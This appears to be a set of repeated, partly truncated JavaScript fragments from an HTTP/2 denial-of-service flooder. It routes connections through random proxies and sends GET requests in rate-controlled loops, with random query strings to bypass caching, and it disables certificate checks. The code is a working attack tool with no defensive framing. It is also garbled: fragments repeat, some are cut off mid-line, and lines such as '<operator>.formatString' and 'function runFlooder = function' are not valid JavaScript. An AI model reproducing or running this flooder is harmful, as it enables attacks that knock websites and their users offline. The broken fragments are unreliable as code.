const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions)
const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 65535,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        })
connection.on("connect", () => {
         connection.write(buffer);
     })
connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     })
client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    let dynHeaders = {}

                    if (Object.keys(parsedHeaders).length !== 0) {
                        let dynPath;

                        if (query === '%RAND%') {
                            dynPath = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
                        } else if (!query) {
                            dynPath = parsedTarget.path;
                        } else {
                            dynPath = parsedTarget.path + "?" + query;
                        }

                        dynHeaders = {
                            ":method": "GET",
                            ":authority": parsedTarget.host,
                            ":scheme": "https",
                            ":path": dynPath,
                            ...parsedHeaders
                        };

                    ...
setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    let dynHeaders = {}

                    if (Object.keys(parsedHeaders).length !== 0) {
                        let dynPath;

                        if (query === '%RAND%') {
                            dynPath = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
                        } else if (!query) {
                            dynPath = parsedTarget.path;
                        } else {
                            dynPath = parsedTarget.path + "?" + query;
                        }

                        dynHeaders = {
                            ":method": "GET",
                            ":authority": parsedTarget.host,
                            ":scheme": "https",
                            ":path": dynPath,
                            ...parsedHeaders
                        };

                    } else {
                        dynHeade...
dynPath = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25)
dynHeaders = {
                            ":method": "GET",
                            ":authority": parsedTarget.host,
                            ":scheme": "https",
                            ":path": dynPath,
                            ...parsedHeaders
                        }
headers["accept-language"] = lang
headers["accept-encoding"] = encoding
const request = client.request(dynHeaders)

                        .on("response", response => {
                            const statusCode = response[':status'];

                            if (_log) {
                                const description = httpStatusCodes[statusCode].Description[httpStatusCodes[statusCode].Color];

                                if (_log === true) {
                                    if (httpStatusCodes[statusCode]) {
                                        log(`${statusCode} ${description}`)
                                    }
                                } else {
                                    if (httpStatusCodes[statusCode] && statusCode === parseInt(_log)) {
                                        log(`${statusCode} ${description}`)
                                    }
                                }
                            }


                            if (payload === '%RAND%') {
                           ...
headers["accept"] = accept
const statusCode = response[':status']
<operator>.formatString("", statusCode, " ", description, "")
function runFlooder = function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            secure: true,
            ALPNProtocols: ['http/1.1', 'h2'],
            sigals: "RSA+SHA256:ECDSA+SHA256",
            socket: connection,
            ecdhCurve: "auto",
            ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305",
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            s...
<operator>.formatString("", statusCode, " ", description, "")
request.write(randstr(25))
_tmp_3.host = parsedTarget.host
